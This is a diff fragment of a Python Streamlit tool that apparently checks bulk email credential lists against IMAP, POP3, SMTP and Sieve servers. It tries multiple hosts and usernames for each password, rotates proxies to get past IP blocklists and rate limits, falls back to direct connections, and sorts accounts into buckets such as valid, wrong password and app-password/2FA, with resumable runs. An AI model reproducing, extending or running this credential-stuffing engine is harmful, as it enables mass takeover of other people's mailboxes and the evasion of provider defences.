+            per_to = max(3.0, min(configured_to, left / max(1, len(rungs))))
+            trace_logs.append(f"--- {label}: {len(rungs)} rung(s), ~{per_to:.1f}s each, "
+                              f"{left:.1f}s window ---")
+
+            for rung_idx, (proto, server, port, tls_mode) in enumerate(rungs):
+                if time.time() > deadline_ts:
+                    trace_logs.append(f"{label}: window reached; stopping this pass "
+                                      f"({len(rungs) - rung_idx} rung(s) not attempted).")
+                    break
+
+                tried_hosts.add(server)
+
+                if px_used and proxy_mode != "off" and proxy_is_quarantined(px_used):
+                    _fresh = sample_alive_proxy(domain=domain, avoid=used_proxies)
+                    if _fresh and _fresh != px_used:
+                        px_used = _fresh
+                        used_proxies.add(_fresh)
+                        trace_logs.append(f"Quarantined node in hand -> switched to fresh "
+                                          f"node {px_tag(px_used)}")
+
+                rotations_left = MAX_ROTATIONS if (allow_rotate and px_used
+                                                   and proxy_mode != "off") else 0
+                seen_px = used_proxies
+                acct_407 = 0
+
+                while True:
+                    if time.time() > deadline_ts:
+                        break
+
+                    _rem = deadline_ts - time.time()
+                    if _rem <= 1.0:
+                        break
+                    attempt_to = max(2.5, min(per_to, _rem))
+                    attempt_to_ref[0] = attempt_to
+
+                    trace_logs.append(f"{px_tag(px_used)} Attempting {proto} "
+                                      f"{tls_mode.upper()} -> Host: {server}:{port}")
+                    server_level_fail = False
+                    rotate_now = False
+                    retry_same = False
+                    retry_same_node = False
+                    proxy_dead = False
+                    err_text = ""
+
+                    for u_idx, user in enumerate(users):
+                        try:
+                            do_attempt(proto, server, port, tls_mode, user, px_used,
+                                       attempt_to, deadline_ts)
+                            record_proxy_attempt(px_used, success=True)
+                            note_verdict(VALID, f"{proto} {server}:{port}", server)
+                            note = "" if user == primary_user else f" | User: {user} (local-part)"
+                            trace_logs.append(f"{px_tag(px_used)} Post-auth {proto} "
+                                              f"verification OK on {server}:{port}{note}")
+                            return (server, VALID,
+                                    f"{px_tag(px_used)} {proto} | Host: {server} | "
+                                    f"Port: {port}{note}",
+                                    px_used, trace_logs), had_net, saw_retry
+
+                        except ProxyAuthError as pae:
+                            err_text = str(pae)
+                            flags["saw_407"] = True
+                            record_proxy_attempt(px_used, success=False,
+                                                 is_network_error=True, is_proxy_auth=True)
+                            host_407[server] = host_407.get(server, 0) + 1
+                            acct_407 += 1
+                            acct_407_total += 1
+                            trace_logs.append(
+                                f"{px_tag(px_used)} -> PROXY 407 {proto} {server}:{port}: "
+                                f"{err_text[:200]} [Classified: proxy_unhealthy]")
+                            proxy_dead = True
+                            rotate_now = True
+                            _su = _subuser_of(px_used)
+                            if px_used and _su and _su not in retried_407_subusers:
+                                retried_407_subusers.add(_su)
+                                retry_same_node = True
+                                proxy_dead = False
+                                rotate_now = False
+
+                        except ProxyTransportError as pte:
+                            err_text = str(pte)
+                            flags["saw_nonproxy"] = True
+                            had_net = True
+                            net_failed_hosts.add(server)
+                            record_proxy_attempt(px_used, success=False,
+                                                 is_network_error=True, is_proxy_auth=False)
+                            trace_logs.append(
+                                f"{px_tag(px_used)} -> PROXY TRANSPORT {proto} {server}:{port}: "
+                                f"{err_text[:200]} [Classified: {FAILED}]")
+                            server_level_fail = True
+                            rotate_now = True
+
+                        except (SmtpAuthError, SieveAuthError) as cnf:
+                            err_text = str(cnf)
+                            flags["saw_nonproxy"] = True
+                            flags["saw_server"] = True
+                            record_proxy_attempt(px_used, success=False, is_network_error=False)
+                            trace_logs.append(
+                                f"{px_tag(px_used)} -> CONFIRM {proto} {server}:{port}: "
+                                f"{err_text[:140]} [Classified: {WRONG} - confirm-only]")
+                            note_verdict(WRONG, f"{proto} {server}:{port} -> {WRONG} "
+                                                 f"(confirm-only)", server)
+                            if u_idx + 1 < len(users):
+                                continue
+                            server_level_fail = True
+                            rotate_now = False
+
+                        except (SmtpSoftError, SieveSoftError) as soft:
+                            err_text = str(soft)
+                            flags["saw_nonproxy"] = True
+                            flags["saw_server"] = True
+                            record_proxy_attempt(px_used, success=False, is_network_error=False)
+                            trace_logs.append(
+                                f"{px_tag(px_used)} -> INCONCLUSIVE {proto} {server}:{port}: "
+                                f"{err_text[:140]} [no verdict change]")
+                            server_level_fail = True
+                            rotate_now = False
+
+                        except ssl.SSLError as ssl_err:
+                            err_text = str(ssl_err)
+                            st_val = classify_error(ssl_err, domain)
+                            flags["saw_nonproxy"] = True
+                            flags["saw_server"] = True
+                            if st_val == FAILED:
+                                had_net = True
+                                net_failed_hosts.add(server)
+                            record_proxy_attempt(px_used, success=False,
+                                                 is_network_error=(st_val == FAILED))
+                            trace_logs.append(f"{px_tag(px_used)} -> TLS FAILED {proto} "
+                                              f"{server}:{port}: {err_text[:140]} "
+                                              f"[Classified: {st_val}]")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
+                            server_level_fail = True
+                            rotate_now = _is_proxy_level_error(err_text) or st_val == FAILED
+
+                        except (socket.timeout, TimeoutError) as to_err:
+                            err_text = str(to_err)
+                            flags["saw_nonproxy"] = True
+                            had_net = True
+                            net_failed_hosts.add(server)
+                            record_proxy_attempt(px_used, success=False, is_network_error=True)
+                            trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} "
+                                              f"{server}:{port}: {err_text[:140]} "
+                                              f"[Classified: {FAILED}]")
+                            server_level_fail = True
+
+                            _kind = _timeout_kind(to_err)
+                            if _kind == "connect":
+                                if px_used and proxy_mode != "off" and not conn_rotated.get(server):
+                                    conn_rotated[server] = True
+                                    rotate_now = True
+                                    trace_logs.append(f"{px_tag(px_used)} Connect-level timeout "
+                                                      f"-> rotating node ONCE, no in-place retry")
+                                else:
+                                    rotate_now = False
+                                    trace_logs.append(f"{px_tag(px_used)} Connect-level timeout "
+                                                      f"-> advancing past {server}:{port} "
+                                                      f"(no in-place retry)")
+                            else:
+                                rotate_now = True
+                                if (retries_by_host.get(server, 0) < same_host_retries
+                                        and (deadline_ts - time.time()) > 7.0):
+                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
+                                    retry_same = True
+
+                        except (socket.error, ConnectionRefusedError) as sock_err:
+                            err_text = str(sock_err)
+                            flags["saw_nonproxy"] = True
+                            had_net = True
+                            net_failed_hosts.add(server)
+                            record_proxy_attempt(px_used, success=False, is_network_error=True)
+                            trace_logs.append(f"{px_tag(px_used)} -> SOCKET FAILED {proto} "
+                                              f"{server}:{port}: {err_text[:140]} "
+                                              f"[Classified: {FAILED}]")
+                            server_level_fail = True
+                            rotate_now = True
+
+                        except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
+                            err_text = str(proto_err)
+                            st_val = classify_error(proto_err, domain)
+                            flags["saw_nonproxy"] = True
+                            flags["saw_server"] = True
+                            record_proxy_attempt(px_used, success=False, is_network_error=False)
+                            trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} "
+                                              f"{server}:{port}: {err_text[:140]} "
+                                              f"[Classified: {st_val}]")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
+
+                            if st_val == LOGIN_DROPPED:
+                                flags["saw_login_drop"] = True
+                                trace_logs.append(
+                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
+                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
+                                    f"password still untested; continuing the ladder")
+
+                            if st_val in (APP, WRONG):
+                                res, had_net, saw_retry, act = _handle_app_or_wrong(
+                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
+                                    had_net, saw_retry)
+                                if res is not None:
+                                    return res, had_net, saw_retry
+                                if act == "retry_user":
+                                    continue
+                                server_level_fail = True
+                                rotate_now = False
+                            elif st_val == RETRY:
+                                saw_retry = True
+                                server_level_fail = True
+                                if "lookup failed" in err_text.lower():
+                                    rotate_now = False
+                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on "
+                                                      f"{server}:{port} -> advancing to next "
+                                                      f"host (no proxy rotation)")
+                                else:
+                                    rotate_now = True
+                            elif st_val == RBL:
+                                trace_logs.append(f"{px_tag(px_used)} RBL block on "
+                                                  f"{server}:{port} -> IP flagged by server, "
+                                                  f"advancing")
+                                server_level_fail = True
+                            elif u_idx + 1 < len(users) and st_val in (UNKNOWN, LOGIN_DROPPED):
+                                flags["saw_server"] = True
+                                px_used, _ok = _rotate_to_fresh(px_used, seen_px,
+                                                                "local-part retry", keep_node=True)
+                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> "
+                                                  f"retrying same host as local-part "
+                                                  f"'{users[u_idx + 1]}'")
+                                continue
+                            elif st_val == LOGIN_DROPPED:
+                                server_level_fail = True
+                                rotate_now = False
+                                trace_logs.append(
+                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> "
+                                    f"advancing the ladder (POP3 / other hosts still get a turn)")
+                            else:
+                                server_level_fail = True
+                                if (st_val == FAILED
+                                        and retries_by_host.get(server, 0) < same_host_retries
+                                        and (deadline_ts - time.time()) > 7.0):
+                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
+                                    retry_same = True
+
+                        except Exception as e:
+                            err_text = str(e)
+                            st_val = classify_error(e, domain)
+                            proxy_level = _is_proxy_level_error(err_text)
+                            if proxy_level:
+                                flags["saw_407"] = True
+                                record_proxy_attempt(px_used, success=False,
+                                                     is_network_error=True, is_proxy_auth=True)
+                                host_407[server] = host_407.get(server, 0) + 1
+                                acct_407 += 1
+                                acct_407_total += 1
+                            else:
+                                flags["saw_nonproxy"] = True
+                                if "Fast-fail DNS check" not in err_text:
+                                    flags["saw_server"] = True
+                            if _is_timeout(e):
+                                had_net = True
+                                net_failed_hosts.add(server)
+                            if st_val == FAILED:
+                                had_net = True
+                                net_failed_hosts.add(server)
+                            record_proxy_attempt(px_used, success=False,
+                                                 is_network_error=(st_val == FAILED))
+                            trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} "
+                                              f"{server}:{port}: {err_text[:140]} "
+                                              f"[Classified: {st_val}]")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
+
+                            if st_val == LOGIN_DROPPED:
+                                flags["saw_login_drop"] = True
+                                trace_logs.append(
+                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
+                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
+                                    f"password still untested; continuing the ladder")
+
+                            if st_val in (APP, WRONG):
+                                res, had_net, saw_retry, act = _handle_app_or_wrong(
+                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
+                                    had_net, saw_retry)
+                                if res is not None:
+                                    return res, had_net, saw_retry
+                                if act == "retry_user":
+                                    continue
+                                server_level_fail = True
+                                rotate_now = False
+                            elif st_val == RETRY:
+                                saw_retry = True
+                                server_level_fail = True
+                                if "lookup failed" in err_text.lower():
+                                    rotate_now = False
+                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on "
+                                                      f"{server}:{port} -> advancing to next "
+                                                      f"host (no proxy rotation)")
+                                else:
+                                    rotate_now = True
+                            elif st_val == RBL:
+                                trace_logs.append(f"{px_tag(px_used)} RBL block on "
+                                                  f"{server}:{port} -> IP flagged by server, "
+                                                  f"advancing")
+                                server_level_fail = True
+                            elif u_idx + 1 < len(users) and st_val in (UNKNOWN, LOGIN_DROPPED):
+                                flags["saw_server"] = True
+                                px_used, _ok = _rotate_to_fresh(px_used, seen_px,
+                                                                "local-part retry", keep_node=True)
+                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> "
+                                                  f"retrying same host as local-part "
+                                                  f"'{users[u_idx + 1]}'")
+                                continue
+                            elif st_val == LOGIN_DROPPED:
+                                server_level_fail = True
+                                rotate_now = False
+                                trace_logs.append(
+                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> "
+                                    f"advancing the ladder (POP3 / other hosts still get a turn)")
+                            else:
+                                server_level_fail = True
+                                rotate_now = rotate_now or proxy_level
+                                if (_is_timeout(e) and _timeout_kind(e) == "connect"
+                                        and not conn_rotated.get(server)):
+                                    conn_rotated[server] = True
+                                    rotate_now = True
+
+                        if proxy_dead:
+                            break
+                        if server_level_fail:
+                            break
+
+                    # FIX P2-1: a same-node 407 retry only earns its slot if a REAL
+                    # attempt still fits.  The old guard asked for 3s of window and
+                    # then slept 0.8s and burned a full attempt.
+                    if retry_same_node and (deadline_ts - time.time()) > (per_to * PROXY_407_RETRY_WINDOW_FACTOR):
+                        trace_logs.append(
+                            f"{px_tag(px_used)} 407 looks like the provider's per-sub-user cap "
+                            f"-> settling {PROXY_407_BACKOFF}s and retrying the SAME node once")
+                        time.sleep(PROXY_407_BACKOFF)
+                        continue
+
+                    if retry_same and (deadline_ts - time.time()) > 5.0:
+                        trace_logs.append(
+                            f"{px_tag(px_used)} Host answered slowly -> backoff "
+                            f"{SLOW_RETRY_BACKOFF}s, retrying {server}:{port} in place "
+                            f"[{retries_by_host.get(server, 0)}/{same_host_retries}]")
+                        time.sleep(SLOW_RETRY_BACKOFF)
+                        continue
+
+                    can_rotate = (
+                        rotate_now and px_used and rotations_left > 0
+                        and (deadline_ts - time.time()) > max(2.0, per_to * 0.5)
+                    )
+                    if can_rotate:
+                        time.sleep(ROTATE_SETTLE)
+                        newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
+                        if newpx and newpx not in seen_px:
+                            seen_px.add(newpx)
+                            px_used = newpx
+                            rotations_left -= 1
+                            trace_logs.append(f"{px_tag(px_used)} Rotating proxy -> retrying "
+                                              f"{server}:{port} "
+                                              f"(host kept, {'407' if proxy_dead else 'net'})")
+                            continue
+
+                    if proxy_dead and acct_407 >= PROXY_407_FORCE_DIRECT:
+                        trace_logs.append(
+                            f"407 storm breaker: {acct_407} proxy-auth failure(s) in this rung "
+                            f"-> bypassing the remaining hosts and going DIRECT.")
+                        force_direct["flag"] = True
+                        return None, had_net, saw_retry
+
+                    break
+
+            return None, had_net, saw_retry
+# @@END 102 CORE_SWEEP
+
+# @@BLOCK 103 CORE_PHASES deps=010,016,100,102
+        def run_phase(px_used, plan_used, deadline_ts, tag):
+            if not plan_used:
+                return None, False, False
+
+            res, net, ret = sweep(px_used, plan_used, deadline_ts, f"{tag} · pass 1",
+                                  allow_rotate=True)
+            if res or force_direct["flag"]:
+                return res, net, ret
+
+            if CFG.get("CHECK_PASS2", CHECK_PASS2_DEFAULT) and net \
+                    and (deadline_ts - time.time()) > 3.0:
+                retry_rungs = [r for r in plan_used if r[1] in net_failed_hosts]
+                if retry_rungs:
+                    res2, net2, ret2 = sweep(px_used, retry_rungs, deadline_ts,
+                                             f"{tag} · pass 2 (fresh proxy per failed host)",
+                                             allow_rotate=True)
+                    return res2, (net or net2), (ret or ret2)
+            return None, net, ret
+
+        direct_first = bool(CFG.get("DIRECT_FIRST", False))
+        if proxy_mode == "off":
+            direct_first = True
+        if not direct_first and proxy_pool:
+            try:
+                if quarantine_size() >= max(3, int(len(proxy_pool) * 0.5)):
+                    direct_first = True
+                    trace_logs.append(f"Pool {quarantine_size()}/{len(proxy_pool)} quarantined "
+                                      f"-> auto Direct-First.")
+            except Exception:
+                pass
+
+        allow_proxy = bool(px) and proxy_mode != "off" and not proxy_is_quarantined(px)
+        direct_gate = (px is None or proxy_mode == "fallback"
+                       or bool(CFG.get("RETRY_CONNECTION_FAILED")) or force_direct["flag"]
+                       or flags["saw_407"])
+        allow_direct = bool(direct_gate)
+
+        def _run_direct(primary_dl, hard_dl):
+            nonlocal retryable
+            dp = [r for r in primary_plan if fast_fail_dns_check(r[1])] or primary_plan
+            df = [r for r in fallback_plan if fast_fail_dns_check(r[1])]
+            dgeo = direct_geo()
+            trace_logs.append(f"direct | {dgeo['ip']} | {dgeo['region']} | "
+                              f"{dgeo['country']} | {dgeo['vpn']}")
+            trace_logs.append(f"DIRECT sweep over {len(dp)} locally-resolving host(s).")
+            res, _nf, ret = run_phase(None, dp, primary_dl, "direct")
+            retryable = retryable or ret
+            if res:
+                return res
+            if (hard_dl - time.time()) > 4.0:
+                res, _nf2, _r = run_phase(None, df, hard_dl, "direct/legacy")
+                if res:
+                    return res
+            return None
+
+        def _run_proxy(primary_dl, hard_dl):
+            nonlocal retryable, net_fail
+            if not allow_proxy:
+                if proxy_mode != "off" and not proxy_pool:
+                    trace_logs.append("No live proxy in the pool -> running only the DIRECT sweep.")
+                return None
+            res, nf, ret = run_phase(px, primary_plan, primary_dl, "proxy")
+            retryable = retryable or ret
+            net_fail = net_fail or nf
+            if res:
+                return res
+            if not force_direct["flag"] and (hard_dl - time.time()) > 4.0:
+                res, _n, _r = run_phase(px, fallback_plan, hard_dl, "proxy/legacy")
+                if res:
+                    return res
+            return None
+
+        if direct_first and allow_direct:
+            trace_logs.append("Phase order: DIRECT first, proxy as fallback.")
+            res = _run_direct(t_start + (budget * DIRECT_FIRST_DIRECT_PRIMARY_FRAC),
+                              t_start + (budget * DIRECT_FIRST_DIRECT_TOTAL_FRAC))
+            if res:
+                return res
+            if allow_proxy:
+                res = _run_proxy(t_start + (budget * DIRECT_FIRST_PROXY_START_FRAC),
+                                 hard_deadline)
+                if res:
+                    return res
+        else:
+            res = _run_proxy(proxy_primary_deadline, proxy_deadline)
+            if res:
+                return res
+            if force_direct["flag"]:
+                trace_logs.append("407 storm breaker tripped -> bypassing the rest of the "
+                                  "proxy pool and running the DIRECT sweep now.")
+            # FIX P0-2: allow_direct was latched BEFORE the proxy phase ran, so in
+            # Proxy Mode = aggressive with Retry CF off a 407-flooded proxy phase
+            # could never fall through to DIRECT - the direct_reason fix was
+            # defeated one line later by the frozen gate.  Recompute it now that
+            # we know what actually happened.
+            allow_direct = (allow_direct or force_direct["flag"] or flags["saw_407"]
+                            or acct_407_total > 0 or net_fail or retryable)
+            direct_reason = (px is None) or net_fail or retryable or force_direct["flag"] \
+                or flags["saw_407"] or acct_407_total > 0
+            if allow_direct and direct_reason:
+                res = _run_direct(direct_primary_deadline, hard_deadline)
+                if res:
+                    return res
+# @@END 103 CORE_PHASES
+
+# @@BLOCK 104 CORE_TAIL deps=016,023,100,103
+    except Exception as e:
+        trace_logs.append(f"Critical Exception in runner: {str(e)}")
+        if best_verdict["status"] is not None:
+            return (None, best_verdict["status"],
+                    best_verdict["detail"] or "retained verdict", None, trace_logs)
+        return None, FAILED, str(e)[:40], None, trace_logs
+
+    if best_verdict["status"] is not None:
+        _bh = best_verdict.get("host") or ""
+        _foreign = bool(_bh) and not _is_local_host(_bh)
+        detail = best_verdict["detail"] or "retained verdict"
+        if _foreign:
+            detail = f"{detail} [retained via FOREIGN host {_bh}]"
+            trace_logs.append(f"NOTE: the retained verdict came from {_bh}, which is not a "
+                              f"local host for {domain}. It may belong to a different provider.")
+        if best_verdict["status"] == WRONG:
+            detail = detail + _wrong_detail_note(domain, password)
+        if best_verdict["status"] == LOGIN_DROPPED:
+            detail = f"{detail} | " + _login_dropped_detail()
+        trace_logs.append("Ladder exhausted with no live answer -> returning retained "
+                          f"verdict [{best_verdict['status']}].")
+        return None, best_verdict["status"], detail, None, trace_logs
+
+    if flags["saw_407"] and not flags.get("saw_server") \
+            and acct_407_total >= PROXY_407_FORCE_DIRECT:
+        trace_logs.append(
+            f"Every attempt died in the PROXY hop ({acct_407_total} x 407, "
+            f"{quarantine_size()} node(s) quarantined) -> the mailbox was never "
+            f"reached, so the password is still untested.")
+        return None, PROXY_UNHEALTHY, (
+            f"proxy refused the MAIL ports with 407 on {acct_407_total} attempt(s) - the mail "
+            f"host was never reached; the pool passes the web probe but cannot pass "
+            f"email-server destinations (provider 'email servers' cap)"
+        ), None, trace_logs
+    if retryable:
+        return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
+    if not dns_ok:
+        return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
+    if flags.get("saw_login_drop"):
+        trace_logs.append(
+            "Mail host answered, accepted the LOGIN command, then closed the socket "
+            "(* BYE) before returning a verdict - server-side drop, not a network fault.")
+        return None, LOGIN_DROPPED, _login_dropped_detail(), None, trace_logs
+    if flags.get("saw_server"):
+        trace_logs.append(
+            "Hosts answered and LOGIN was issued, but every server dropped the "
+            "connection before a verdict -> password still untested.")
+        return None, FAILED, (
+            "mail host reached but the server dropped LOGIN (server-side) - try the "
+            "other protocol/host, or an app password"
+        ), None, trace_logs
+    return None, FAILED, ("all hosts unreachable (timeouts/refused) - password could not "
+                          "be tested"), None, trace_logs
+# @@END 104 CORE_TAIL
+
+# @@BLOCK 105 RUN_TRIGGER_UI deps=034,055,083,087
+section_title("🚀", "Execute Live Checking Engine",
+              "proxy-backed, post-auth verified, resumable")
+
+RESULT_ACTION_MODES = BUCKETS
+ACTION_OPTIONS = list(PREFILTER_LABELS) + [label for label, _ in BUCKETS]
+
+col_action1, col_action2 = str_lit.columns([0.65, 0.35])
+with col_action1:
+    start_engine_btn = str_lit.button("🔥 Start Live Checking Engine", type="primary")
+with col_action2:
+    engine_action_mode = str_lit.selectbox(
+        "Engine Action Mode:", options=ACTION_OPTIONS, index=0,
+        key="bb_action_mode",
+        help="Pick a pre-filter bucket (SMTP Failed sits right after DNS Failed) or a "
+             "previous result bucket to re-run."
+    )
+    unfinished_runs = list_unfinished_runs()
+    unfinished_pick = None
+    if engine_action_mode == "Resume Unfinished":
+        labels = [f"{r.get('saved_at', '')} | {r.get('reason', 'stop')} | "
+                  f"{r.get('checked', 0)}/{r.get('total', 0)}" for r in unfinished_runs] \
+                 or ["none saved"]
+        unfinished_pick = str_lit.selectbox("Unfinished run:", labels, key="bb_unfinished_pick")
+
+active_proxy_pool = get_filtered_active_proxies()
+
+if start_engine_btn:
+    clear_proxy_quarantine()
+    log_probe_event("run start: 407 quarantine cleared")
+    progress_bar = str_lit.progress(0, text=f"Initializing checking engine "
+                                            f"for [{engine_action_mode}]...")
+    status_text = str_lit.empty()
+    status_text.info("⏳ Opening the engine - resolving hosts, pre-testing the proxy pool, "
+                     "geo-tagging nodes.")
+
+    log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode "
+                f"on category: [{engine_action_mode}].")
+    log_startup(
+        f"RUN CONFIG -> protocols={CFG.get('PROTOCOLS')} workers={CFG.get('MAX_WORKERS_START')} "
+        f"deadline={CFG.get('ACCOUNT_DEADLINE')}s "
+        f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
+        f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
+        f"confirm_wrong={CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')} "
+        f"retry_direct={CFG.get('RETRY_CONNECTION_FAILED')} debug={CFG.get('DEBUG')} "
+        f"test_flight={CFG.get('PROXY_TEST_FLIGHT')} "
+        f"allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
+        f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
+        f"smtp_precheck={CFG.get('SMTP_CHECK')} connection={CFG.get('CONNECTION_HINT')} "
+        f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
+        f"subuser_conc={CFG.get('PROXY_SUBUSER_CONCURRENCY')} "
+        f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
+        f"max_rotations={CFG.get('MAX_ROTATIONS')} check_pass2={CFG.get('CHECK_PASS2')} "
+        f"direct_first={CFG.get('DIRECT_FIRST')} mail_spot={CFG.get('MAIL_SPOT_CHECK')}"
+    )
+
+    resume_lines = []
+    if engine_action_mode == "Resume Unfinished" and unfinished_runs \
+            and unfinished_pick and unfinished_pick != "none saved":
+        idx = [f"{r.get('saved_at', '')} | {r.get('reason', 'stop')} | "
+               f"{r.get('checked', 0)}/{r.get('total', 0)}"
+               for r in unfinished_runs].index(unfinished_pick)
+        resume_lines = unfinished_runs[idx].get("remaining") or []
+
+    _label_to_key = dict(RESULT_ACTION_MODES)
+
+    def _raw_of(line):
+        return line.split("|")[0].strip()
+
+    category_queue_map = {
+        "Ready to Check": clean_lines,
+        "Resume Unfinished": resume_lines,
+        "Disposables": disp,
+        "Typos": typo,
+        "Skip previously valid": resume,
+        "App-Skipped": app_skip,
+        "Custom Filtered": custom_skipped,
+        "DNS Failed": dns_skipped,
+        "SMTP Failed": smtp_skipped,
+    }
+    if engine_action_mode in _label_to_key:
+        category_queue_map[engine_action_mode] = [
+            _raw_of(x) for x in str_lit.session_state.get(_label_to_key[engine_action_mode], [])
+        ]
+
+    accounts_to_check = category_queue_map.get(engine_action_mode, [])
+
+    if not accounts_to_check:
+        str_lit.warning(f"⚠ No accounts found in the selected category: "
+                        f"'{engine_action_mode}'.")
+    else:
+        filtered_pool[:] = get_filtered_active_proxies()
+
+        STATE["run_active"] = True
+
+        _prev_tg = list(STATE.get("probe_targets_override") or [])
+        _tg = _set_probe_targets_from_queue(
+            accounts_to_check,
+            cap=max(1, int(CFG.get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT))))
+        _targets_changed = bool(_tg) and list(_tg) != _prev_tg
+
+        with alive_pool_lock:
+            _pool_warm = bool(alive_pool)
+
+        if not _pool_warm:
+            with str_lit.spinner("Cold pool - waiting for the probe to finish..."):
+                _t0 = time.time()
+                while _PROBE_OWNER_LOCK.locked() and (time.time() - _t0) < (PROBE_BUDGET_START + 10):
+                    time.sleep(0.2)
+                with alive_pool_lock:
+                    _pool_warm = bool(alive_pool)
+                if not _pool_warm:
+                    refresh_alive_pool(force=True, budget=PROBE_BUDGET_START)
+                    with alive_pool_lock:
+                        _pool_warm = bool(alive_pool)
+        elif _targets_changed and CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT) == PROBE_TARGET_AUTO:
+            threading.Thread(
+                target=lambda: refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET),
+                daemon=True, name="start-refresh").start()
+            log_probe_event("start: pool warm, target changed -> background refresh, "
+                            "run starts immediately")
+
+        if alive_pool:
+            active_proxy_pool = list(alive_pool)
+        elif CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT):
+            active_proxy_pool = []
+        else:
+            active_proxy_pool = list(filtered_pool)
+
+        log_startup(
+            f"PROXY HEALTH BANNER -> loaded={len(all_proxies)} filtered={len(filtered_pool)} "
+            f"alive={len(alive_pool)} quarantined={quarantine_size()}"
+        )
+        _msr = STATE.get("mail_spot") or {}
+        if _msr.get("auth") and not _msr.get("ok") and _msr.get("n"):
+            str_lit.error(
+                f"🚨 **Mail-destination spot check says the pool cannot reach MAIL ports** - "
+                f"{_msr['auth']}/{_msr['n']} sampled node(s) returned 407 against "
+                f"{_msr['host']}:{_msr['port']}. The run will spend its window on the proxy "
+                f"hop. Set **Proxy Mode Engine = off** (DIRECT) or wait for the provider cap "
+                f"to reset."
+            )
+        if all_proxies and not alive_pool:
+            str_lit.warning(
+                "⚠ **Proxy health: 0 nodes passed the tunnel probe.** Every account will run "
+                "DIRECT. Press 📥 Fetch & Test All Proxies, then try again - that is a pool "
+                "problem, not a mailbox problem."
+            )
+
+        with session_state_lock:
+            str_lit.session_state.valid_results = load_persistent_valid_results()
+            str_lit.session_state.run_valid_count = 0
+            str_lit.session_state.clean_valid_count = 0
+            str_lit.session_state.wrong_results = []
+            str_lit.session_state.need_app_results = []
+            str_lit.session_state.conn_results = []
+            str_lit.session_state.proxy_results = []
+            str_lit.session_state.login_drop_results = []
+            str_lit.session_state.retry_results = []
+            str_lit.session_state.rbl_results = []
+            str_lit.session_state.smtp_results = list(str_lit.session_state.get("pre_smtp_failed", []))
+            str_lit.session_state.dns_results = list(str_lit.session_state.get("pre_dns_failed", []))
+            str_lit.session_state.skip_results = []
+            str_lit.session_state.unknown_results = []
+            str_lit.session_state.report_entries = []
+            str_lit.session_state.log_lines = []
+            str_lit.session_state.checked_emails_set = set()
+            str_lit.session_state.last_checked_index = 0
+            str_lit.session_state.engine_has_run = True
+            str_lit.session_state.run_completion_status = "Unfinished"
+
+            start_dt = datetime.now()
+            str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
+            str_lit.session_state.end_timestamp = None
+            str_lit.session_state.total_duration = None
+
+        exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream",
+                                             "📊 Live Report Log & Analytics"])
+        with exec_tab1:
+            log_container = str_lit.empty()
+        with exec_tab2:
+            report_metrics_placeholder = str_lit.empty()
+            bucket_placeholders = {}
+            BUCKET_SPEC = [
+                ("valid_results", "✅ Valid Accounts Found"),
+                ("wrong_results", "❌ Wrong Password Found"),
+                ("login_drop_results", "🚪 Login Dropped (* BYE)"),
+                ("conn_results", "🔌 Connection Failed Found"),
+                ("proxy_results", "🩹 Proxy Unhealthy Found"),
+                ("need_app_results", "🔐 App Password / 2FA Found"),
+                ("retry_results", "🕓 RETRY_LATER Found"),
+                ("rbl_results", "🚫 RBL Blocked Found"),
+                ("smtp_results", "📮 SMTP Failed (pre-check)"),
+                ("dns_results", "🛰 DNS Failed (pre-check)"),
+                ("skip_results", "⏭ Skipped / Filtered"),
+                ("unknown_results", "❓ Unclassified"),
+            ]
+            for _key, _title in BUCKET_SPEC:
+                with str_lit.expander(f"{_title}", expanded=False):
+                    bucket_placeholders[_key] = str_lit.empty()
+            report_log_container = str_lit.empty()
+
+        all_target_accounts = (accounts_to_check[:CFG["MAX_ACCOUNTS"]]
+                               if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check)
+        total_accs = len(all_target_accounts)
+        checked_count = 0
+        thread_local = threading.local()
+        log_cap = LOG_CAP_DEBUG if CFG.get("DEBUG", False) else LOG_CAP_QUIET
+        _last_ui_ts = 0.0
+        _last_df_ts = 0.0
+
+        def render_buckets(snapshot):
+            for key, title in BUCKET_SPEC:
+                ph = bucket_placeholders.get(key)
+                if ph is None:
